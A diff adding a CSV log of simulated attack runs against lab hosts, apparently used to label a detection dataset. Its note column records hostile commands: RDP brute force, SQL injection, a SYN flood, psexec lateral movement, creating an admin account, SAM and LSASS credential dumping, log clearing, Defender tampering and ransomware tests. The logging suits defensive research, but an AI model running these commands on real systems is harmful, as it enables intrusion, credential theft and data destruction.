@@ -1,0 +1,14 @@
+run_id,scenario,host,start,end,note
+bf-01,bruteforce,WIN10-01,2026-11-20T02:00:00Z,2026-11-20T02:04:30Z,hydra -l administrator -P pass.txt rdp://10.10.20.100
+rdp-01,rdp_compromise,WIN10-01,2026-11-20T02:10:00Z,2026-11-20T02:16:00Z,xfreerdp login then whoami / powershell -enc / certutil / Run key
+scan-01,port_scan,WIN10-01,2026-11-20T02:20:00Z,2026-11-20T02:22:00Z,nmap -sS -sV 10.10.20.100
+sqli-01,sql_injection,WEB-SRV,2026-11-20T02:30:00Z,2026-11-20T02:35:00Z,sqlmap -u http://10.10.50.20/dvwa/vulnerabilities/sqli/?id=1 --batch
+web-01,web_attack,WEB-SRV,2026-11-20T02:40:00Z,2026-11-20T02:44:00Z,DVWA XSS + file inclusion + command injection
+dos-01,dos,WEB-SRV,2026-11-20T02:50:00Z,2026-11-20T02:52:00Z,hping3 -S --flood -p 80 10.10.50.20
+disc-01,discovery,WIN10-01,2026-11-20T03:00:00Z,2026-11-20T03:03:00Z,Atomic T1087.001 T1082 T1016
+lat-01,lateral_movement,WIN10-02,2026-11-20T03:10:00Z,2026-11-20T03:13:00Z,psexec \\10.10.20.101 cmd from WIN10-01
+acct-01,account_manipulation,WIN10-01,2026-11-20T03:20:00Z,2026-11-20T03:21:00Z,net user test P@ss123 /add + localgroup administrators
+cred-01,credential_access,WIN10-01,2026-11-20T03:30:00Z,2026-11-20T03:32:00Z,reg save HKLM\SAM + comsvcs MiniDump
+evade-01,defense_evasion,WIN10-01,2026-11-20T03:40:00Z,2026-11-20T03:41:00Z,wevtutil cl Security + Set-MpPreference
+ransom-01,ransomware,WIN10-02,2026-11-20T03:50:00Z,2026-11-20T03:54:00Z,Atomic T1490 + T1486 on a snapshotted VM
+dns-01,dns_tunneling,WIN10-02,2026-11-20T04:00:00Z,2026-11-20T04:04:00Z,dnscat2 / Atomic T1071.004
